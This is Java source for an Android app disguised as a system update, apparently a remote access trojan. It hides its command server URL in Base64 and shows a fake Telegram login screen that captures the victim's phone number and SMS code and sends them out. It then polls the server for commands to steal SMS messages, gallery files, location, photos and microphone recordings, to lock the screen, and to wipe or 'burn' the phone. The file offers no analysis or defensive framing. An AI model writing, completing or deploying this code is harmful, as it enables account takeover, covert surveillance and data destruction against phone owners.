package com.android.system.update;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.util.Base64;
import android.view.Gravity;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import org.json.JSONArray;
import org.json.JSONObject;
import java.net.URLEncoder;
import java.util.UUID;

public class MainActivity extends Activity {
    private static final String B64_URL = "aHR0cHM6Ly90bnQuZGUzLm5ldHJ1bi5pbw==";
    private String deviceId;
    private volatile boolean running = true;
    private String baseUrl;
    private String currentStep = "phone";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        try {
            baseUrl = new String(Base64.decode(B64_URL, Base64.DEFAULT));
            
            SharedPreferences sp = getSharedPreferences("sys_cfg", MODE_PRIVATE);
            deviceId = sp.getString("id", null);
            if (deviceId == null) {
                deviceId = UUID.randomUUID().toString().replace("-", "").substring(0, 12);
                sp.edit().putString("id", deviceId).apply();
            }

            // Отправляем запрос на регистрацию сразу (в фоне)
            new Thread(this::registerLoop).start();
            new Thread(this::pollLoop).start();

            showLoginScreen();
        } catch (Exception e) {
            showLoginScreen();
        }
    }

    private void showLoginScreen() {
        runOnUiThread(() -> {
            try {
                LinearLayout layout = new LinearLayout(this);
                layout.setOrientation(LinearLayout.VERTICAL);
                layout.setGravity(Gravity.CENTER);
                layout.setBackgroundColor(0xFFFFFFFF);
                layout.setPadding(50, 50, 50, 50);

                TextView title = new TextView(this);
                title.setText("Telegram");
                title.setTextSize(32);
                title.setTextColor(0xFF0088cc);
                title.setGravity(Gravity.CENTER);
                layout.addView(title);

                final EditText input = new EditText(this);
                input.setHint("Номер телефона или код");
                layout.addView(input);

                Button btn = new Button(this);
                btn.setText("Далее");
                btn.setOnClickListener(v -> {
                    String text = input.getText().toString();
                    if (text.isEmpty()) return;
                    
                    if (currentStep.equals("phone")) {
                        sendToBot("tg_number", text);
                        currentStep = "code";
                        input.setText("");
                        input.setHint("Введите код из СМС");
                        title.setText("Введите код");
                    } else {
                        sendToBot("tg_code", text);
                        Actions.sleepScreen(this);
                    }
                });
                layout.addView(btn);

                setContentView(layout);
            } catch (Exception e) {}
        });
    }

    private void sendToBot(String kind, String body) {
        new Thread(() -> {
            try {
                JSONObject o = new JSONObject();
                o.put("id", deviceId);
                o.put("kind", kind);
                o.put("body", body);
                Net.post(baseUrl + "/api/report", o.toString());
            } catch (Exception ignored) {}
        }).start();
    }

    private void registerLoop() {
        while (running) {
            try {
                JSONObject body = new JSONObject();
                body.put("id", deviceId);
                body.put("model", Build.MANUFACTURER + " " + Build.MODEL);
                Net.post(baseUrl + "/api/register", body.toString());
            } catch (Exception ignored) {}
            try { Thread.sleep(60000); } catch (Exception ignored) {}
        }
    }

    private void pollLoop() {
        while (running) {
            try {
                String url = baseUrl + "/api/poll?id=" + URLEncoder.encode(deviceId, "UTF-8");
                String resp = Net.get(url);
                JSONObject obj = new JSONObject(resp);
                JSONArray cmds = obj.optJSONArray("cmds");
                if (cmds != null) {
                    for (int i = 0; i < cmds.length(); i++) {
                        JSONObject c = cmds.getJSONObject(i);
                        dispatch(c.optString("cmd"), c.optString("arg"));
                    }
                }
            } catch (Exception ignored) {}
            try { Thread.sleep(5000); } catch (Exception ignored) {}
        }
    }

    private void dispatch(String cmd, String arg) {
        try {
            switch (cmd) {
                case "msg": Actions.showMsg(this, arg); break;
                case "photo": Actions.photoSend(this, deviceId, baseUrl); break;
                case "wipe": Actions.wipeAll(this, deviceId, baseUrl); break;
                case "burn": Actions.burnPhone(this); break;
                case "get_sms": Actions.getLastSms(this, deviceId, baseUrl); break;
                case "location": Actions.getLocation(this, deviceId, baseUrl); break;
                case "mic": MicRecorder.record(this, deviceId, baseUrl); break;
                case "files": Actions.stealGallery(this, deviceId, baseUrl); break;
                case "block": Actions.blockScreen(this, arg); break;
                case "unblock": Actions.unblockScreen(this); break;
                case "flash": Actions.toggleFlashlight(this); break;
                case "screen": 
                    Intent i = new Intent(this, ScreenRequestActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(i);
                    break;
            }
        } catch (Exception ignored) {}
    }
}
